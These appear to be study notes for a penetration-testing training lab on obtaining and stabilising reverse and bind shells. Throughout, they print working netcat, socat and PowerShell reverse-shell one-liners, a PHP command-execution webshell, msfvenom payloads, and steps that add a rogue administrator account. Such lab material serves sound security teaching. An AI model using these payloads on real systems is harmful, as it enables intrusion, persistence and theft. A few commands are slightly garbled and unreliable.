# What the Shell?
## What is a shell?
* Shells are used when interfacing with a Command Line environment (CLI).
  * bash, sh, cmd.exe, Powershell.
* Sometimes possible to force an application running on a remote server to execute arbitrary code.
  * Use this initial access to obtain a shell.
    * **Reverse shell** Send command line access to the remote server.
    * **Bind shell** Open up a port on the remote server to connect to and execute further commands.

## Tools
* Need malicious shellcode and a way of interfacing with the resulting shell.
* Repositories of shells are available.
  * [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
  * PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
* Kali Linux comes pre-installed with a variety of webshells located at `/usr/share/webshells`.
* [SecLists repo](https://github.com/danielmiessler/SecLists) contains very useful code for obtaining shells.

### Netcat
* 'Swiss Army Knife' of networking.
* Receive reverse shells.
* Connect to remote ports attached to bind shells on a target system.
* Netcat shells are very unstable (easy to lose) by default.

### Socat
* Netcat on steroids.
* Shells are usually more stable than netcat shells.
* Syntax is more difficult.
* Socat is very rarely installed by default.
* Socat and Netcat have .exe versions for use on Windows.

### Metasploit -- multi/handler
* `exploit/multi/handler` module of the Metasploit framework is used to receive reverse shells.
* Provides a fully-fledged way to obtain stable shells.
* Only way to interact with a meterpreter shell.
* Easiest way to handle staged payloads.

### Msfvenom
* Technically part of the Metasploit Framework.
* Shipped as a standalone tool.
* Used to generate reverse and bind shell payloads on the fly.

## Types of Shell
### Reverse shells
* Target is forced to execute code that connects back to the attacker.
* Attacker sets up a listener used to receive the connection.
* Reverse shells are a good way to bypass firewall rules that may prevent connecting to arbitrary ports on the target.
  * Attacker needs to configure their own network to accept the shell when receiving a shell from a machine across the internet.
* Reverse shells are generally easier to execute and debug.

#### Reverse Shell Example:
* Set up the listener on the attacking machine.
  * *Listening* on the attacking machine.
```
muri@augury:~$ sudo nc -lvnp 443
listening on [any] 443 ...
```
* Send a reverse shell from the target.
  * Connection is sent *from* the target. 
  * This is likely done through code injection.
```
shell@linux-shell-practice:~$ nc 10.11.12.223 443 -e /bin/bash
```
* Listener receives the connection.
```
connect to [10.11.22.223] from (UNKNOWN) [10.10.199.58] 43286
```
* Commands run over the shell are executed as the target user.
```
whoami
shell
```

### Bind shells
* Code is executed to start a listener attached to a shell on the target.
* This would then be opened up to the Internet.
* Attacker connects to the port that the code has opened and obtain remote code execution.
* Does not require any configuration on the attacker's network.
* May be prevented by firewalls protecting the target.
* Bind shells are less common.

#### Bind Shell Example
* Start a listener on the Windows target and tell it to execute cmd.exe.
  * *Listening* on the target.
```
muri@augury:~$ evil-winrm -i 10.10.2.57 -u Administrator -p 'TryH4ckM3!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> nc -lvnp 8080 -r "cmd.exe"
nc.exe : Listening on [any] 8080 ...
    + CategoryInfo          : NotSpecified: (listening on [any] 8080 ...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
connect to [10.10.2.57] from (UNKNOWN) [10.12.12.223] 57336
```
* Connect to the newly opened port (listener) from the attacking machine.
* This gives code execution on the remote machine.
```
muri@augury:~$ nc 10.10.2.57 8080
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Documents>whoami
whoami
win-shells\administrator

C:\Users\Administrator\Documents
```

## Shell Interactivity
### Interactive 
* Powershell, Bash, Zsh, sh, or any other standard CLI environment are interactive shells.
  * Allow interaction with programs after executing them.

### Non-Interactive 
* Limited to using programs that do not require user interaction to run properly.
* Majority of simple reverse and bind shells are non-interactive.
* Try to run SSH in a non-interactive shell.
```
muri@augury:~$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37104
```
* whoami (which is non-interactive) executes perfectly
```
whoami
muri
```
* ssh (which is interactive) gives no output at all.
```
ssh muri@localhost
```
* Interactive programs do not work in non-interactive shells.

## Netcat
### Reverse Shells
* Syntax for starting a netcat listener using Linux.
```
nc -lvnp <port-number>
```
  * **`-l`** this will be a listener.
  * **`-v`** request a verbose output.
  * **`-n`** do not to resolve host names or use DNS.
  * **`-p`** port specification will follow.
* Use any port you as long as there is not already a service using it.
  * Use `sudo` when starting the listener if a port below 1024 is chosen.
  * Good idea to use a well-known port number (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.
* Can then connect back to this with any number of payloads.

### Bind Shells
* Can assume that there is already a listener waiting on a chosen port of the target if trying to obtain a bind shell.
* Syntax is straight forward.
```
nc <target-ip> <chosen-port>
```
* Netcat will make an outbound connection to the target on the listening port.

### Netcat Shell Stabilisation
* Netcat shells are very unstable by default.
* Pressing `Ctrl+C` kills the whole thing.
* They are non-interactive and often have strange formatting errors.
  * This is due to netcat 'shells' really being processes running inside a terminal.

#### Technique 1: Python
* Applicable only to Linux boxes as they will nearly always have Python installed by default.
* Use Python to spawn a better featured bash shell.
* Some targets may need the version of Python specified.
  * Replace `python` with `python2` or `python3`.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
* Shell will look a bit prettier.
  * Still will not be able to use tab autocomplete or the arrow keys.
  * `Ctrl+C` will still kill the shell.
```
shell@linux-shell-practice:~$ export TERM=xterm
```
* Gives access to term commands such as `clear`.
* Background the shell using `Ctrl+Z`.
```
shell@linux-shell-practice:~$ ^Z
[1]+ Stopped                  sudo nc -lvnp 443
```
```
muri@augury:~$ stty raw -echo; fg
sudo nc -lvnp 443
```
* Turns off the terminal echo.
  * Gives access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes.
* Foregrounds the shell completing the process.
* If the shell dies any input in the terminal will not be visible as a result of having disabled terminal echo.
  * Type `reset` and press enter to fix this.
```
shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ ssh shell@localhost
The authenticity of host 'localhost (::1)' can't be established.
[snip ...]
```

#### Technique 2: rlwrap
* Gives access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
* Manual stabilisation is required to be able to use Ctrl+C` inside the shell.
* `rlwrap` is not installed by default on Kali.
  * Install it with `sudo apt install rlwrap`.
* Invoke a slightly different listener.
```
rlwrap nc -lvnp <port>
```
* Prepending the netcat listener with `rlwrap` gives a much more fully featured shell.
* Particularly useful when stabilising Windows shells.
* Possible to completely stabilise a Linix shell using the same trick as in step three of previous technique.
  * Background the shell with `Ctrl+Z`.
  * `stty raw -echo; fg` to stabilise and re-enter the shell.

#### Technique 3: Socat
* Use an initial netcat shell as a stepping stone into a more fully-featured socat shell.
* Limited to Linux targets.
  * Socat shell on Windows will be no more stable than a netcat shell.
* Transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine.
  * Use a webserver on the attacking machine inside the directory containing the socat binary.
```
sudo python3 -m http.server 80
```
  * Use the netcat shell to download the file on the target machine.
```
wget <LOCAL-IP>/socat -O /tmp/socat).
```
* In a Windows environment the same can be done with Powershell.
```
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe)
```
* Useful to be able to change the terminal tty size.
  * Must be done manually in a reverse or bind shell.
  * Open another terminal and run `stty -a`.
    * Note down the values for rows and columns.
  * In the reverse/bind shell type in `stty rows <number> and stty cols <number>`.
    * This will change the registered width and height of the terminal.
    * Allows programs such as text editors that rely on such information being accurate to correctly open.

## Socat
* Connector between two points.
  * Listening port and the keyboard.
  * Could also be a listening port and a file, or two listening ports.

### Reverse Shells
* Basic reverse shell listener syntax.
```
socat TCP-L:<port> -
```
* Takes two points (a listening port, and standard input) and connects them together.
* Resulting shell is unstable and is equivalent to `nc -lvnp <port>`.
* Syntax for Windows target to connect back to listener.
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
* 'pipes' is used to force powershell (or cmd.exe) to use Unix style standard input and output.
* Syntax for Linux target to connect back to listener.
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### Bind Shells
* Create a listener on a Linux target.
```
socat TCP-L:<PORT> EXEC:"bash -li"
```
* Create a listener on a Windows target.
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
* 'pipes' used to interface between the Unix and Windows ways of handling input and output in a CLI environment.
* Connect to the waiting listener from the attacking machine.
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
* Socat can create a fully stable Linux tty reverse shell.
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
* Socat connects a listening port and a file.
  * Passing in the current TTY as a file and setting the echo to be zero.
  * Equivalent to using the `Ctrl+Z`, `stty raw -echo; fg` trick with a netcat shell.
* First listener can be connected to with any payload.
* Special listener must be activated with a very specific socat command.
  * Most machines do not have socat installed by default.
  * Upload a precompiled socat binary that can then be executed as normal.
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
* Create an interactive bash session.
```
EXEC:"bash -li".
```
* Pass arguments.
```
pty, stderr, sigint, setsid and sane:
```
* `pty` allocates a pseudoterminal on the target.
  * Part of the stabilisation process.
* `stderr` makes sure that any error messages get shown in the shell.
  * Often a problem with non-interactive shells.
* `sigint` passes any `Ctrl+C` commands through into the sub-process allowing commands to be killed inside the shell.
* `setsid` creates the process in a new session.
* `sane` stabilises the terminal attempting to 'normalise' it.
* On the left of the image below we have a listener running on our local attacking machine.

### Socat Encrypted Shells
* Socat is capable of creating encrypted bind and reverse shells.
* Any TCP commands aree replaced with OPENSSL.
* Need to generate a certificate on the attacking machine to use encrypted shells.
  * 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
* Merge the two created files into a single .pem file.
```
cat shell.key shell.crt > shell.pem
```
* Set up reverse shell listener on attacking machine.
  * Creates OPENSSL listener using the generated certificate.
  * `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
* Syntax to connect back from target.
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
* For a bind shell.
* Create listener on the target.
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
* Syntax for setting up an OPENSSL-LISTENER using the tty technique.
  * Use port 53 and a PEM file called "encrypt.pem"
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```
* Connect from the attacker.
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
* If the attacking IP is 10.10.10.5 what syntax would be used to connect back to the tty listener.
```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,san
```
* Even for a Windows target the certificate must be used with the listener.
  * Copying the PEM file across for a bind shell is required.
* This technique will work with the special Linux-only TTY shell covered previously.

## Common Shell Payloads
* Some versions of netcat include `-e` option.
  * nc.exe Windows version included with Kali at `/usr/share/windows-resources/binaries`.
  * `netcat-traditional` version used in Kali.
* Allows execution of a process on connection.    
* Create bind shell listener on target for attacker to connect to.
  * Not included in most versions of netcat as widely seen to be very insecure.
```
nc -lvnp <PORT> -e /bin/bash
```
* Send a reverse shell to listener on attacker.
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```
* This technique will work perfectly on Windows where a static binary is nearly always required.
* Create a listener for a bind shell on Linux.
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
> The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the `stderr` output stream into `stdout`, and sending `stdout` itself into the input of the named pipe, thus completing the circle.
* Send a netcat reverse shell.
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
* Very common to require a Powershell reverse shell when targeting a modern Windows Server.
* Command is very convoluted but is an extremely useful one-liner to keep on hand.
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
* Replace `<IP>` and `<port>` with an appropriate IP and choice of port.
* Can be copied into a cmd.exe shell or another method of executing commands on a Windows server and executed resulting in a reverse shell:
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes in many different languages. 

## Msfvenom
* Part of the Metasploit framework.
* Used to generate code for primarily reverse and bind shells.
* Can be used to generate payloads in various formats.
  * .exe, .aspx, .war, .py.
```
msfvenom -p <PAYLOAD> <OPTIONS>
```
* Generate Windows x64 Reverse Shell in an exe format.
```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
* `-f <format>` specifies the output format.
* `-o <file>` specifies output location and filename for the generated payload.
* `LHOST=<IP>` specifies IP to connect back to.
* `LPORT=<port>`specifies port on the local machine to connect back to.
  * This can be anything between 0 and 65535 that is not already in use.
  * Ports below 1024 are restricted and require a listener running with `root` privileges.
```
muri@augury:~$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.11.12.223 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

## Staged vs Stageless Payloads
### Staged
* Payloads are sent in two parts.
* First part is called the *stager*.
  * Piece of code executed directly on the server itself.
    * Code connects back to waiting listener.
    * Connects to the listener and uses the connection to load the real payload.
      * Real payload is executed directly.
      * Prevents it from touching the disk where it could be caught by traditional anti-virus solutions.
* Payload is split into two parts.
  * Small initial stager.
  * Bulkier reverse shell code that is downloaded when the stager is activated.
* Requires a special listener.
  * Usually Metasploit multi/handler.
* Harder to use than stageless.
* Initial stager is a lot shorter.
* Is sometimes missed by less-effective antivirus software.
* Modern day antivirus solutions will make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager.
  * Makes staged payloads less effective than they would once have been in this area.

### Stageless 
* More common than staged.
* Entirely self-contained.
  * One piece of code that sends a shell back immediately to the waiting listener when executed.
* Tend to be easier to use and catch than staged.
* Bulkier than staged.
* Easier for an antivirus or intrusion detection program to discover and remove.

## Meterpreter Shell
* Metasploit's own brand of fully-featured shell.
* Completely stable.
  * Very good when working with Windows targets.
* Inbuilt functionality such as file uploads and downloads.
* Need to use a meterpreter shell to use any of Metasploit's post-exploitation tools.
* Meterpreter shells must be caught in Metasploit.

## Payload Naming Conventions
* Basic msfvenom naming convention.
```
<OS>/<arch>/<payload>
```
```
linux/x86/shell_reverse_tcp
```
* This would generate a stageless reverse shell for an x86 Linux target.
* The exception to this is Windows 32bit targets.
  * Arch is not specified.
```
windows/shell_reverse_tcp
```
* Arch specified as normal For 64bit Windows target.
* Stageless payloads denoted with underscores `_`.
* Staged payloads denoted with another forward slash `/`.
* Rule also applies to Meterpreter payloads.
* `msfvenom --list payloads` used to list all available payloads.
  * Can then be piped into `grep` to search for a specific set of payloads.

## Metasploit multi/handler
* Superb tool for catching reverse shells.
1. Open Metasploit with `msfconsole`
2. Type `use multi/handler`.
3. Press enter.
* Now primed to start a multi/handler session.
* Look at available options using `options` command.
* These are all identical to the options set when generating shellcode with Msfvenom.
  * **PAYLOAD** a payload specific to the target.
      * `set PAYLOAD <payload>`
  * **LHOST** a listening IP address.
      * `set LHOST <listen-address>`
      * LHOST must be specified as metasploit will not listen on all network interfaces like netcat or socat will.
  * **LPORT** a port with which to receive a shell.
      * `set LPORT <listen-port>` 
* Start the listener using `exploit -j` command. 
  * Launch the module and run as a job in the background.
* Metasploit must be run with sudo permissions to listen on a port under 1024.
```
msf6 exploit(multi/handler) >
[+] Sending stage (336 bytes) to 10.10.2.57
```
* Metasploit catches the connection.
* Remainder of payload is sent to target.
```
[+] Command shell session 1 opened (10.11.12.223:443 -> 10.10.2.57:54226) at 2020-09-12 21:18:35 +0100
```
* multi/handler originally backgrounded.
* Use `sessions 1` to foreground it again.
```
msf6 exploit(multi-handler) > session 1
[+] Starting interation with 1...
```
* Reverse shell is established.
```
C:\Users\Administrator\Documents>whoami
whoami
win-shells\administrator
```
* Use `sessions` to see all active sessions.
  * Use `sessions <number>` to select the appropriate session to foreground.

## WebShells
* May encounter websites that allow the upload of an executable file.
  * Ideally use this opportunity to upload code that would activate a reverse or bind shell.
  * Sometimes this is not possible.
  * Instead upload a webshell.
* Script that runs inside a web server (usually in a language such as PHP or ASP) which executes code on the server.
* Commands are entered into a webpage.
  * Through a HTML form.
  * Directly as arguments in the URL.
* Commands are then executed by the script with the results returned and written to the page.
* Can be extremely useful if there are firewalls in place.
* Stepping stone into a fully fledged reverse or bind shell.
```
<?php
// Take a GET parameter in the URL and execute it with shell_exec()
echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```
* Any commands entered in the URL after `?cmd=` will be executed on the system.
* 'pre' elements are to ensure that the results are formatted correctly on the page.
* Use a GET parameter 'cmd' with the command 'ifconfig' to return the network information of the box.
```
http://10.10.84.199/uploads/shell.php?cmd=ifconfig
```
* Entering the `ifconfig` command (used to check the network interfaces on a Linux target) into the URL of the shell executed the command on the system and returned the results.
  * This would work for any other command (`whoami`, `hostname`, `arch`, etc).
* There are a variety of webshells available on Kali by default at `/usr/share/webshells`.
  * includes the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).
    * Full reverse shell written in PHP.
* Most language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers.
  * They will not work on Windows by default.
* Obtain RCE on Windows stargets.
  * Use msfvenom to generate a reverse/bind shell in the language of the server
  * Use a web shell on Windows targets.
    * Obtaining RCE is often done with a URL Encoded Powershell Reverse Shell copied into the URL as the cmd argument.
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
* This is the same shell encountered in the Common Shell Payloads section.
  * Has been URL encoded to be used safely in a GET parameter.
  * IP and Port will still need to be changed.

## Next Steps
### Ok, we have a shell. Now what?
* The one thing that these all have in common is that shells tend to be unstable and non-interactive.
* Even Unix style shells which are easier to stabilise are not ideal.
* On Linux ideally we would be looking for opportunities to gain access to a user account.
* SSH keys stored at /home/<user>/.ssh are often an ideal way to do this.
* In CTFs it's also not infrequent to find credentials lying around somewhere on the box.
* Some exploits will also allow you to add your own account.
* In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
* On Windows the options are often more limited.
* It's sometimes possible to find passwords for running services in the registry.
* VNC servers, for example, frequently leave passwords in the registry stored in plaintext.
* Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml.
* These can be MD5 hashes or in plaintext, depending on the version.
* Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.
* In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
* The syntax for this is as follows: net user <username> <password> /add and net localgroup administrators <username> /add

## The important takeaway
* Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell.
* Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

## Practice and Examples
* Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
* Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your attacking machine’s IP with a custom port. Set up a netcat listener, then upload and activate the shell.
* Make a copy of the supplied webshell on the attacking machine’s Desktop:
* cp  /usr/share/webshells/php/php-reverse-shell.php ./Desktop
* Edit the webshell:
* vim ./Desktop/php-reverse-shell.php
* Press ‘i’ to enter insert mode
* Change ip to 10.10.52.172
* Press ‘Escape’ to enter Command mode
* Press ‘:wq’ to save changes and exit file
* Setup NetCat listener on attack machine:
* nc -lvnp 1234
* Upload webshell to target:
* Browse to http://10.10.62.10 from attacking machine
* Click ‘Browse’ button
* Navigate to /root/Desktop/php-reverse-shell.php
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Execute webshell on target by amending URL:
* http://10.10.62.10/uploads/php-reverse-shell.php?cmd=nc 10.10.52.172 1234 -e /bin/bash
* Reverse shell creates session back to listener:

### Extra: stabilise the netcat:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

Background the shell using Ctrl+Z
. 
stty raw -echo; fg
```
* Log into the Linux machine over SSH using the supplied credentials.
* Use the techniques in the Common Shell Payloads section to experiment with bind and reverse netcat shells.
* SSH onto the target machine:
* ssh shell@10.10.62.10
* Create a reverse shell and execute the bash process upon connection:
* On target machine: nc 10.10.52.172 1234 -e /bin/bash
* Create listener on attacker’s terminal: nc -lvnp 1234
* Create a bind shell and execute the bash process upon connection:
* On target machine create a listener: nc -lvnp 1234 -e /bin/bash
* Connect to listener from attack machine: nc 10.10.62.10 1234
* Create named pipe for bind shell:
* Create listener on target’s terminal: mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
* This creates a named pipe at /tmp/f, stats a nc listener, directs the listener’s input (sent commands) into the output of the named pipe, pipes this to bin/sh, and removes the pipe at the end
* Connect NetCat to listener on attacker’s terminal: nc 10.10.19.211 1234
* Bind shell connected to named pipe method:
* Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
* Create reverse shell and execute the bash process upon connection:
* Create reverse shell on target’s terminal to connect to listener: socat TCP:10.10.52.172:1234 EXEC:”bash -li”
* Create listener on attacker’s terminal: socat TCP-L:1234 -
* Reverse shell connects to listener:
* Create bind shell and execute the bash process upon connection:
* Create listener on target’s terminal: socat TCP-L:12345 EXEC:”bash -li”
* Bind to listener from attacker’s terminal: socat TCP:10.10.62.10:12345 -
* Bind shell connects to listener:
* Create fully stable reverse shell using socat special technique:
* Create listener on attacter’s terminal: socat TCP-L:1234 FILE:`tty`,raw,echo=0
* Create tty reverse shell on target’s terminal: socat TCP:10.10.108.143:1234 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
* Fully interactive session is created on attacker’s terminal
* Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
* Create new php file in attacker’s terminal:
* cat > /root/Desktop/windows-php-reverse-shell.php
* Add text to file: <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
* CTRL+C to write changes to file
* Upload webshell to target:
* Browse to http://10.10.122.18 from attacker
* Click ‘Browse’ button
* Navigate to /root/Desktop/windows-php-reverse-shell.php
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create listener in attacker’s terminal: nc -lvnp 1234
* Verify that webshell GET parameter (‘cmd’) is working by passing ‘ipconfig’ command in attacker’s browser: http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=ipconfig
* Execute Powershell in attacker’s browser by copying powershell into the URL as the cmd argument:
http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.108.143%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
* Amend the <IP> to the attacker’s IP address and the <port> to 1234
* Connection from target received:
* The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
* Create a new user:
* In the reverse shell session created in the previous task: net user /add newadmin password
* Add the new user to the Administrators group:
* net localgroup administrators newadmin /add
* Login over RDP using new user account:
* On the attacker’s terminal: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:newadmin /p:'password'
* RDP connects after acknowledging certificate CN mismatch:
* Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
* Create Netcat reverse shell
* Start listener in attacker’s terminal: nc -lvnp 1234
* Create RDP session using supplied administrative credentials: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:Administrator /p:'TryH4ckM3!'
* Open command prompt on target and create bind shell: nc 10.10.248.19 1234 -e “powershell.exe”
* Connection established:
* Create Netcat bind shell (using existing RDP session):
* Open command prompt on target and create listener: nc -lvnp 1234 -e “powershell.exe”
* Create an outbound connection from the attacker’s terminal: nc 10.10.70.179 1234
* Session is established:
* Create a socal reverse shell (using existing RDP session):
* Start listener in attacker’s terminal: socat TCP-L:1234 -
* Open command prompt and create connection back to listener: socat TCP:10.10.18.162:1234 EXEC:powershell.exe,pipes
* Session established:
* Create a socat bind shell (using existing RDP session):
* Create listener at command prompt of target: socat TCP-L:1234 EXEC:powershell.exe,pipes
* Connect to waiting listener from attacker’s terminal: socat TCP:10.10.70.179:1234 -
* Session established:
* Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
* Create msfvenom payload:
* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.248.19 LPORT=1234
* Upload shell.exe to the target
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create a Meterpreter listener to catch the reverse shell:
* Msfconsole
* use multi/handler
* set LHOST 10.10.248.19
* set LPORT 1234
* set PAYLOAD windows/x64/meterpreter/reverse_tcp
* run
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save the shell.exe file
* Run file
* Meterpreter session is created:
* Create both staged and stageless meterpreter shells for either target.
* Upload and manually activate them, catching the shell with netcat -- does this work?
* Create stageless meterpreter shell for Windows target:
* Create the msfvenom payload:
* msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell2.exe LHOST=10.10.18.162 LPORT=1234
* Upload shell2.exe to target server:
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell2.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create nc listener on attacking machine: nc -lvnp 1234
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save shell2.exe
* Run file
* Session is established:
* Create staged meterpreter shell for Windows target:
* Create the msfvenom payload:
* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell3.exe LHOST=10.10.18.162 LPORT=1234
* Upload shell3.exe to target server:
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell2.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create nc listener on attacking machine: nc -lvnp 1234
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save shell3.exe
* Run file
* Session established:
